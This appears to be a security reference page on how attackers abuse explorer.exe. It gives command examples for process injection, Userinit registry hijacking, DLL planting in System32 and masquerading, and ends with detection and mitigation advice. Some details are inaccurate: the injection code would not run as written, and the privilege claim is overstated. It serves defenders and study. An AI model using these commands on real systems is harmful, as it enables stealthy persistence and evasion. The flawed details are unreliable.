# explorer.exe
## What is it?
*```explorer.exe``` is the **Windows shell process**, responsible for managing the taskbar, desktop, file explorer, and UI components.
It is an essential Windows process that is often **trusted and whitelisted**, making it a prime target for attackers seeking to **bypass security controls, execute payloads, or achieve persistence**.*

## Legitimate Usage
- ***Graphical Shell Management** → Controls the desktop, taskbar, and Start menu.*
- ***File Explorer** → Manages file browsing and interactions with the file system.*
- ***User Authentication** → Launches upon user login to initialize the Windows environment.*
- ***Application Launcher** → Runs programs when a user double-clicks a file or shortcut.*
- ***Handles Windows Session State** → Ensures smooth transition between logins, logouts, and system interactions.*

*Since ```explorer.exe``` is crucial for system usability, blindly blocking or terminating it can cause system instability.*

## How to abuse it
- ***Trusted Process** → Runs with high privileges and is rarely flagged as suspicious.*
- ***Can Execute Arbitrary Code** → Attackers can inject payloads into it.*
- ***Persistence Mechanism** → Can be restarted automatically when a user logs in.*
- ***Redirection & Execution Hijacking** → Attackers can manipulate it to launch malicious binaries instead of the legitimate Windows shell.*

## Example Attacks
### 1. Process Injection into explorer.exe
*Attackers inject malicious code into ```explorer.exe``` to hide execution inside a **trusted process**.*
- **Using PowerShell for Process Injection**
```
$code = [System.Text.Encoding]::UTF8.GetBytes("malicious shellcode here")
$proc = Get-Process explorer | Select-Object -First 1
$handle = OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = VirtualAllocEx($handle, [IntPtr]::Zero, $code.Length, 0x1000, 0x40)
WriteProcessMemory($handle, $addr, $code, $code.Length, [IntPtr]::Zero)
CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```
*Injects shellcode into ```explorer.exe```, allowing execution under a trusted process.*

### 2. Persistence via Userinit Key Hijacking
*Attackers **replace** ```explorer.exe``` with a malicious executable or **hijack userinit registry keys** to execute their payloads.*
- **Modifying the Registry to Hijack Explorer Startup**
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\malicious.exe" /f
```
*Instead of running the legitimate ```explorer.exe```, Windows will launch malicious.exe upon login.*

### 3. DLL Hijacking via explorer.exe
*```explorer.exe``` loads various DLLs during execution. Attackers can **plant a malicious DLL in a location where Explorer will load it**, effectively running code within Explorer’s context.*
- **Dropping a Malicious DLL in Explorer’s Search Path**
```
copy malicious.dll "C:\Windows\System32\explorerframe.dll"
```
*When ```explorer.exe``` loads, it will execute the attacker’s **malicious DLL** instead of the legitimate one.*

### 4. Masquerading as explorer.exe for Defense Evasion
*Attackers can **rename malware** to ```explorer.exe``` or **execute payloads using the legitimate** ```explorer.exe``` to bypass detection.*
- **Executing Malware Through ```explorer.exe```**
```
explorer.exe C:\Users\Public\malware.exe
```
*The malware runs under the **legitimate** ```explorer.exe```, making detection harder.*

# Detection & Mitigation
## Detection Methods
**Monitor Unexpected Process Injections**
- *Look for ```explorer.exe``` **spawning unknown processes** (```Process Explorer```, ```Sysmon Event ID 10```).*
- *Detect ```explorer.exe``` **with unusual memory allocations** (```EDR memory scan```).*

**Detect Userinit Key Hijacking**
- *Monitor **registry changes to** ```Userinit``` **key** (```Sysmon Event ID 13```).*
- *Detect if ```explorer.exe``` is replaced with a **non-standard executable**.*

**Detect Suspicious DLL Loading**
- *Enable **DLL Load Logging** (```Sysmon Event ID 7```).*
- *Check for ```explorer.exe``` **loading unknown or unsigned DLLs**.*

## Mitigation Strategies
- ***Restrict Access to Critical Registry Keys** → Use Group Policy to prevent modification of ```Userinit```.*
- ***Enable Windows Defender Attack Surface Reduction (ASR)** → Block process injections into ```explorer.exe```.*
- ***Harden DLL Loading Paths** → Use ```CWDIllegalInDllSearch``` to prevent DLL hijacking.*
- ***Monitor File Integrity** → Detect unauthorized modifications to ```explorer.exe``` and its dependencies.*
